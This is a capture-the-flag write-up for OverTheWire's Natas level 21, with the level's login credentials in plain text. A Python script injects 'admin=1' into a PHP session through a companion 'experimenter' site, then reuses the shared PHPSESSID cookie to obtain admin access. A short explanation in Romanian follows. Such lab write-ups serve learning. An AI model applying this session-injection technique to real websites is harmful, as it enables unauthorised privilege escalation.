
# General info

Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
URL:      http://natas21.natas.labs.overthewire.org

# Special code section

```py
import requests

response = requests.post(
    url="http://natas21-experimenter.natas.labs.overthewire.org/index.php",
    auth=("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH"),
    params={
        "debug" : "sa fie",
        "submit" : "1",
        "admin" : "1",
    }
)

sid = response.cookies.get_dict()["PHPSESSID"]

response = requests.post(
    url="http://natas21.natas.labs.overthewire.org/index.php",
    auth=("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH"),
    params={
        "debug" : "sa fie"
    },
    cookies={
        "PHPSESSID" : sid
    }
)

if "You are logged in as a regular user" not in response.text:
    print(response.text.split("The credentials for the next level are:<br><pre>")[1].split("</pre>")[0])
else:
    print("some error occurred")
```


Uitandu-ma in codul de pe `natas21-experimenter`, am vazut ca, daca `$_REQUEST` are o cheie care se numeste `submit`, toate valorile din `params` vor fi copiate in `$_SESSION`.
Asta m-a dus cu gandul la un _shared session cookie_.